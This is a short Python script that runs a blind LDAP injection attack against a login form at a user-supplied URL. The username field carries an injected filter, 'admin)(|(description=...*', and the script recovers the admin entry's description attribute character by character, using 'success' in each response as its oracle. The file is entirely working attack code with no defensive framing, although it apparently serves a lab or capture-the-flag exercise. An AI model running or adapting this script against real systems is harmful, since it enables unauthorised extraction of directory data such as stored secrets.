import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase, ascii_uppercase, digits, punctuation
alc = ascii_lowercase + ascii_uppercase + digits + punctuation

# Convert input to integer
limit = int(input("What is the limit? "))
url = input("What is the URL? ")

result = []
base = 1

while base <= limit:
    found = False
    for i in alc:
        # Format the username string with the current base and character
        username = f"admin)(|(description={''.join(result)}{i}*"
        params = {'username': username, 'password': 'invalid)'}
        response = requests.post(url, data=params)
        data = response.text

        # Check if "success" is in the response text
        if "success" in data:
            print(f"Got it! This payload worked: {username}")
            base += 1  # Increment base if the payload worked
            result.append(i)
            found = True
            break  # Exit the for loop and continue with the next base
        else:
            print(f"Testing character '{i}' at position {base}...")
    
    # Ensure the loop condition is checked after each complete iteration
    if not found:
        print("No matching character found for the current position.")
        break

final_answer = ''.join(result)
print(f"The final answer is: {final_answer}")
